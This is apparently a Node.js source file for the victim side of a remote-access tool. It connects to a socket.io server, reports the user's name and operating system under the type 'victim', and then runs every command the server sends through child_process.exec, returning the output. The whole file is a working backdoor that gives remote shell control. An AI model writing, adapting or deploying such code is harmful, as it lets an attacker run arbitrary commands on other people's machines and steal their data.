const io = require('socket.io-client');
const socket = io('http://localhost:3000');
const chalk = require("chalk");
const { exec } = require("child_process");
const os = require("os");

console.log(chalk.blue("\nConnecting...\n"))

socket.on('connect', () => {
    console.log(chalk.green("Successfully connected"));
    console.log(chalk.blue("Sending authentification..."))
    socket.emit("auth", {username:os.userInfo().username, os:os.type(), type:"victim"});
    console.log(chalk.green("Successfully authentified"))
});

//On order
socket.on("request", function(data){
    exec(data, (error, stdout, stderr) => {
        if (error) {
            return error.message;
        }
        socket.emit("response", {response:stdout})
    });
    
});


socket.on('disconnect', () => {
    console.log(chalk.red("Disconnected"))
});
